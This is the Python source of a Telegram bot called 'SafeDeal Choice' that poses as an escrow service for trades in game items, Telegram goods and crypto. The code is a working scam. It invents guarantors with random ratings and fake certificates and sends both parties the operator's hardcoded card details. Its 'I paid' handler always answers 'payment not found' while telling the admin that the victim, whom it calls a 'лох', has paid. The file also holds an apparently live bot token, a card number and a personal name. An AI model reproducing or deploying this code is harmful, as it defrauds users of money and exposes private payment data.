import asyncio, logging, random, json, os
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ParseMode

BOT_TOKEN = "8856958854:AAHUShuODrvX9xG5H8btqLnE1nhZDJNRryo"
ADMIN_ID = 7263901569
SUPPORT_USERNAME = "@safedeal_support"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
user_sessions = {}
pending_deals = {}
admin_data = {"requisites": "4177 4901 4338 9205\nГулумкан Д.", "deals_count": 0}

def generate_garants():
    g = {}
    used = set()
    names = ["Александр", "Михаил", "Дмитрий", "Сергей", "Андрей"]
    lasts = ["Смирнов", "Кузнецов", "Попов", "Васильев", "Петров"]
    emoji = ["🛡", "🔒", "💎", "🎯", "🏆"]
    for _ in range(10):
        while True:
            name = random.choice(names) + " " + random.choice(lasts)
            if name not in used:
                used.add(name)
                break
        gid = "gar_" + str(random.randint(1000, 9999))
        g[gid] = {
            "name": name,
            "deals": random.randint(500, 3500),
            "rating": round(random.uniform(4.5, 5.0), 2),
            "emoji": random.choice(emoji)
        }
    return g

GARANTS = generate_garants()

GAMES = {
    "Roblox": ["Adopt Me", "MM2", "Steal A Brainrot", "BloxFruits", "Robux"],
    "Brawl Stars": ["Гемы", "Аккаунты", "Скины"],
    "PUBG Mobile": ["UC", "Аккаунты"],
    "Free Fire": ["Алмазы"],
    "Minecraft": ["Лицензия", "Hypixel Coins"]
}

TELEGRAM_ITEMS = ["NFT", "Telegram Stars", "Telegram Premium", "TG Канал"]

def generate_cert():
    return "CERT-" + str(random.randint(100000, 999999))

def start_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🎮 Игровой маркетплейс", callback_data="gaming"))
    kb.add(InlineKeyboardButton("✈️ Telegram раздел", callback_data="telegram"))
    kb.add(InlineKeyboardButton("💱 Крипта / Обмен", callback_data="crypto"))
    kb.add(InlineKeyboardButton("🔗 Присоединиться к сделке", callback_data="join"))
    kb.add(InlineKeyboardButton("🔍 Выбрать гаранта", callback_data="garants"))
    kb.add(InlineKeyboardButton("🛡 Защита сделок", callback_data="protection"))
    kb.add(InlineKeyboardButton("📞 Саппорт", callback_data="support"))
    return kb

def back_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back"))
    return kb

def wait_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("❌ Отменить сделку", callback_data="cancel_deal"))
    return kb

def paid_kb(uid):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("✅ Я оплатил", callback_data="paid_" + str(uid)))
    kb.add(InlineKeyboardButton("❌ Отменить", callback_data="cancel_" + str(uid)))
    return kb

def admin_kb(deal_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("💰 Отправить реквизиты", callback_data="areq_" + deal_id))
    kb.add(InlineKeyboardButton("💬 Написать", callback_data="amsg_" + deal_id))
    kb.add(InlineKeyboardButton("✅ Завершить", callback_data="adone_" + deal_id))
    kb.add(InlineKeyboardButton("❌ Отклонить", callback_data="acancel_" + deal_id))
    return kb

@dp.message_handler(commands=["start"])
async def start(msg: types.Message):
    await msg.answer("🛡 <b>SafeDeal Choice</b>\n\n0% комиссия\nЗащищённые сделки\n\n<i>Выберите раздел:</i>", parse_mode=ParseMode.HTML, reply_markup=start_kb())

@dp.message_handler(commands=["reply"])
async def reply_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    parts = msg.text.split(maxsplit=2)
    if len(parts) < 3:
        await msg.answer("❌ /reply SD-12345 текст")
        return
    deal_id = parts[1]
    text = parts[2]
    deal = pending_deals.get(deal_id)
    if not deal:
        await msg.answer("❌ Сделка не найдена")
        return
    for u in [deal["creator"], deal["partner"]]:
        if u:
            kb = paid_kb(u) if deal.get("req_sent") else wait_kb()
            await bot.send_message(u, "💬 <b>Гарант:</b>\n" + text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await msg.answer("✅ Отправлено в " + deal_id)

@dp.message_handler(commands=["admin"])
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("💰 Изменить реквизиты", callback_data="adm_changereq"))
    kb.add(InlineKeyboardButton("📋 Сделки", callback_data="adm_list"))
    await msg.answer("<b>👑 Админ-панель</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "adm_changereq")
async def change_req(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    user_sessions[call.from_user.id] = {"step": "changing_req"}
    await call.message.edit_text("💰 Введите новые реквизиты:", reply_markup=back_kb())

@dp.message_handler(lambda m: m.from_user.id == ADMIN_ID and user_sessions.get(m.from_user.id, {}).get("step") == "changing_req")
async def save_req(msg: types.Message):
    admin_data["requisites"] = msg.text
    del user_sessions[msg.from_user.id]
    await msg.answer("✅ Готово!")

@dp.callback_query_handler(lambda c: c.data == "adm_list")
async def list_deals(call: types.CallbackQuery):
    if not pending_deals:
        await call.message.edit_text("Нет сделок.", reply_markup=back_kb())
        return
    text = "<b>Сделки:</b>\n\n"
    for did in pending_deals:
        text += "▫️ " + did + "\n"
    await call.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())

@dp.callback_query_handler(lambda c: c.data.startswith("amsg_"))
async def prompt_msg(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    user_sessions[call.from_user.id] = {"step": "msg_to_deal", "deal_id": deal_id}
    await call.message.edit_text("💬 Введите сообщение:", reply_markup=back_kb())

@dp.message_handler(lambda m: m.from_user.id == ADMIN_ID and user_sessions.get(m.from_user.id, {}).get("step") == "msg_to_deal")
async def send_msg_to_deal(msg: types.Message):
    deal_id = user_sessions[msg.from_user.id]["deal_id"]
    deal = pending_deals.get(deal_id)
    del user_sessions[msg.from_user.id]
    if not deal:
        return await msg.answer("❌ Не найдена")
    for u in [deal["creator"], deal["partner"]]:
        if u:
            kb = paid_kb(u) if deal.get("req_sent") else wait_kb()
            await bot.send_message(u, "💬 <b>Гарант:</b>\n" + msg.html_text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await msg.answer("✅ Отправлено!")

@dp.callback_query_handler(lambda c: c.data.startswith("areq_"))
async def send_reqs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.get(deal_id)
    if not deal:
        return
    deal["req_sent"] = True
    cert = generate_cert()
    deal["cert"] = cert
    req_text = "💰 <b>РЕКВИЗИТЫ</b>\n\n<pre>" + admin_data["requisites"] + "</pre>\n\n🛡 Сертификат: <code>" + cert + "</code>\n\n<i>После перевода нажмите «Я оплатил».</i>"
    for u in [deal["creator"], deal["partner"]]:
        if u:
            await bot.send_message(u, req_text, parse_mode=ParseMode.HTML, reply_markup=paid_kb(u))
    await call.answer("✅ Отправлено!")

@dp.callback_query_handler(lambda c: c.data.startswith("adone_"))
async def done(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.pop(deal_id, None)
    if deal:
        for u in [deal["creator"], deal["partner"]]:
            if u:
                await bot.send_message(u, "✅ <b>Сделка завершена!</b>", parse_mode=ParseMode.HTML)
    await call.answer("✅ Завершено!")

@dp.callback_query_handler(lambda c: c.data.startswith("acancel_"))
async def cancel_deal_admin(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.pop(deal_id, None)
    if deal:
        for u in [deal["creator"], deal["partner"]]:
            if u:
                await bot.send_message(u, "❌ <b>Сделка отклонена.</b>", parse_mode=ParseMode.HTML)
    await call.answer("❌ Отклонено!")

@dp.callback_query_handler(lambda c: c.data == "gaming")
async def gaming(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    for g in GAMES:
        kb.add(InlineKeyboardButton("🎮 " + g, callback_data="game_" + g))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back"))
    await call.message.edit_text("<b>🎮 Игры</b>\nВыберите игру:", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith("game_"))
async def game_items(call: types.CallbackQuery):
    game_name = call.data.split("_", 1)[1]
    if game_name not in GAMES:
        return
    kb = InlineKeyboardMarkup(row_width=1)
    for item in GAMES[game_name]:
        kb.add(InlineKeyboardButton("• " + item, callback_data="item_" + game_name + "_" + item))
    kb.add(InlineKeyboardButton("🔙 К играм", callback_data="gaming"))
    await call.message.edit_text("<b>" + game_name + "</b>\nВыберите предмет:", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "telegram")
async def telegram(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    for item in TELEGRAM_ITEMS:
        kb.add(InlineKeyboardButton("✈️ " + item, callback_data="tgit_" + item))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back"))
    await call.message.edit_text("<b>✈️ Telegram раздел</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith("item_") or c.data.startswith("tgit_") or c.data == "crypto")
async def create_deal(call: types.CallbackQuery):
    uid = call.from_user.id
    data = call.data
    deal_id = "SD-" + str(random.randint(10000, 99999))
    if data == "crypto":
        user_sessions[uid] = {"deal_id": deal_id, "type": "crypto", "step": "waiting_info"}
        await call.message.edit_text("📝 <b>Сделка " + deal_id + "</b>\n\nВведите условия:", parse_mode=ParseMode.HTML, reply_markup=back_kb())
    elif data.startswith("tgit_"):
        item = data.split("_", 1)[1]
        user_sessions[uid] = {"deal_id": deal_id, "type": "tg", "item": item, "step": "waiting_info"}
        await call.message.edit_text("📝 <b>Сделка " + deal_id + "</b>\n✈️ " + item + "\n\nВведите условия:", parse_mode=ParseMode.HTML, reply_markup=back_kb())
    else:
        parts = data.split("_", 2)
        game = parts[1]
        item = parts[2]
        user_sessions[uid] = {"deal_id": deal_id, "type": "game", "game": game, "item": item, "step": "waiting_info"}
        await call.message.edit_text("📝 <b>Сделка " + deal_id + "</b>\n🎮 " + game + " → " + item + "\n\nВведите условия:", parse_mode=ParseMode.HTML, reply_markup=back_kb())

@dp.message_handler(lambda m: not m.text.startswith("/"))
async def conditions(msg: types.Message):
    uid = msg.from_user.id
    if uid == ADMIN_ID and user_sessions.get(uid, {}).get("step") == "changing_req":
        admin_data["requisites"] = msg.text
        del user_sessions[uid]
        return await msg.answer("✅ Реквизиты обновлены!")
    if uid in user_sessions and user_sessions[uid].get("step") == "waiting_code":
        return await join_code(msg)
    for did, deal in pending_deals.items():
        if deal.get("partner") and uid in [deal["creator"], deal["partner"]]:
            other = deal["creator"] if uid == deal["partner"] else deal["partner"]
            sender_name = "Участник 1" if uid == deal["creator"] else "Участник 2"
            if other:
                await bot.send_message(other, "💬 <b>" + sender_name + ":</b>\n" + msg.text, parse_mode=ParseMode.HTML)
            await bot.send_message(ADMIN_ID, "📩 <b>Чат " + did + "</b>\n👤 " + sender_name + " | ID: <code>" + str(uid) + "</code>\n💬 " + msg.text + "\n\n<i>/reply " + did + " текст</i>", parse_mode=ParseMode.HTML)
            return
    if uid not in user_sessions or user_sessions[uid].get("step") != "waiting_info":
        return
    deal_id = user_sessions[uid]["deal_id"]
    user_sessions[uid]["info"] = msg.text
    user_sessions[uid]["step"] = "waiting_partner"
    cert = generate_cert()
    pending_deals[deal_id] = {
        "creator": uid,
        "partner": None,
        "info1": msg.text,
        "type": user_sessions[uid].get("type"),
        "game": user_sessions[uid].get("game"),
        "item": user_sessions[uid].get("item"),
        "req_sent": False,
        "cert": cert
    }
    await msg.answer("✅ <b>Сделка " + deal_id + " создана!</b>\n\n📋 Код: <code>" + deal_id + "</code>\n🛡 Сертификат: <code>" + cert + "</code>\n\nОтправьте код партнёру.", parse_mode=ParseMode.HTML, reply_markup=wait_kb())

@dp.callback_query_handler(lambda c: c.data == "join")
async def join(call: types.CallbackQuery):
    user_sessions[call.from_user.id] = {"step": "waiting_code"}
    await call.message.edit_text("🔗 Введите код сделки:", reply_markup=back_kb())

async def join_code(msg: types.Message):
    uid = msg.from_user.id
    code = msg.text.strip()
    if code not in pending_deals:
        return await msg.answer("❌ Не найдена")
    deal = pending_deals[code]
    if deal["partner"]:
        return await msg.answer("❌ Занята")
    if deal["creator"] == uid:
        return await msg.answer("❌ Нельзя")
    for did, d in pending_deals.items():
        if d.get("partner") and uid in [d["creator"], d["partner"]]:
            return await msg.answer("❌ Вы в другой сделке")
    deal["partner"] = uid
    admin_data["deals_count"] += 1
    cid = deal["creator"]
    user_sessions[uid] = {"deal_id": code, "step": "in_deal"}
    user_sessions[cid]["step"] = "in_deal"
    await bot.send_message(ADMIN_ID, "💰 <b>СДЕЛКА " + code + "</b>\n\n👤 Лох 1: @" + (await bot.get_chat(cid)).username + " | <code>" + str(cid) + "</code>\n💬 " + deal["info1"] + "\n\n👤 Лох 2: @" + msg.from_user.username + " | <code>" + str(uid) + "</code>\n🛡 Сертификат: <code>" + deal.get("cert", "N/A") + "</code>\n\n<i>/reply " + code + " текст</i>", parse_mode=ParseMode.HTML, reply_markup=admin_kb(code))
    for u in [cid, uid]:
        await bot.send_message(u, "✅ <b>Пара найдена!</b>\n\n🛡 Сделка: " + code + "\n📋 Сертификат: <code>" + deal.get("cert", "N/A") + "</code>\n\n<i>Гарант подключается. Все сообщения видны.</i>", parse_mode=ParseMode.HTML, reply_markup=wait_kb())

@dp.callback_query_handler(lambda c: c.data == "protection")
async def protection(call: types.CallbackQuery):
    await call.message.edit_text("🛡 <b>ЗАЩИТА СДЕЛОК</b>\n\n▫️ Страховка до 50 000₽\n▫️ Сертификат на каждую сделку\n▫️ Арбитраж 24/7\n▫️ 0% комиссия\n\n<i>SafeDeal — с 2024 года.</i>", parse_mode=ParseMode.HTML, reply_markup=back_kb())

@dp.callback_query_handler(lambda c: c.data.startswith("paid_"))
async def paid(call: types.CallbackQuery):
    uid = int(call.data.split("_")[1])
    await call.message.edit_text("⏳ Проверяем...")
    await asyncio.sleep(5)
    await bot.send_message(ADMIN_ID, "⚠️ Лох " + str(uid) + " перевёл!")
    await call.message.answer("❌ Платёж не найден. Повторите.", reply_markup=paid_kb(uid))

@dp.callback_query_handler(lambda c: c.data.startswith("cancel_") or c.data == "cancel_deal")
async def cancel_lox(call: types.CallbackQuery):
    uid = call.from_user.id
    if call.data.startswith("cancel_"):
        uid = int(call.data.split("_")[1])
    did = user_sessions.get(uid, {}).get("deal_id")
    if did in pending_deals:
        deal = pending_deals.pop(did)
        other = deal["creator"] if uid == deal["partner"] else deal["partner"]
        if other:
            await bot.send_message(other, "❌ Участник отменил сделку.")
        await bot.send_message(ADMIN_ID, "ℹ️ Сделка " + did + " отменена.")
    if uid in user_sessions:
        del user_sessions[uid]
    await call.message.edit_text("❌ Отменено.")

@dp.callback_query_handler(lambda c: c.data == "back")
async def back(call: types.CallbackQuery):
    if call.from_user.id in user_sessions:
        if user_sessions[call.from_user.id].get("step") == "in_deal":
            return await call.answer("❌ Вы в активной сделке!", show_alert=True)
        del user_sessions[call.from_user.id]
    await call.message.edit_text("🛡 <b>Меню</b>", parse_mode=ParseMode.HTML, reply_markup=start_kb())

@dp.callback_query_handler(lambda c: c.data == "support")
async def support(call: types.CallbackQuery):
    await call.answer("📞 " + SUPPORT_USERNAME + " (24/7)", show_alert=True)

@dp.callback_query_handler(lambda c: c.data == "garants")
async def garants(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    for gid, g in GARANTS.items():
        btn_text = g["emoji"] + " " + g["name"] + " | " + str(g["deals"]) + " | " + str(g["rating"])
        kb.add(InlineKeyboardButton(btn_text, callback_data="gsel_" + gid))
    kb.add(InlineKeyboardButton("🔄 Обновить", callback_data="gref"))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back"))
    await call.message.edit_text("<b>🔒 Гаранты</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "gref")
async def ref(call: types.CallbackQuery):
    global GARANTS
    GARANTS = generate_garants()
    await garants(call)

@dp.callback_query_handler(lambda c: c.data.startswith("gsel_"))
async def sel(call: types.CallbackQuery):
    g = GARANTS.get(call.data.split("_", 1)[1])
    if not g:
        return
    user_sessions[call.from_user.id] = {"garant": g, "step": "waiting_info"}
    text = g["emoji"] + " <b>" + g["name"] + "</b>\n\n⭐ " + str(g["rating"]) + "\n📊 " + str(g["deals"]) + " сделок\n✅ Проверен\n\nВведите сумму и описание:"
    await call.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())

if __name__ == "__main__":
    print("🛡 SafeDeal запущен!")
    print("Реквизиты: " + admin_data["requisites"])
    executor.start_polling(dp, skip_updates=True)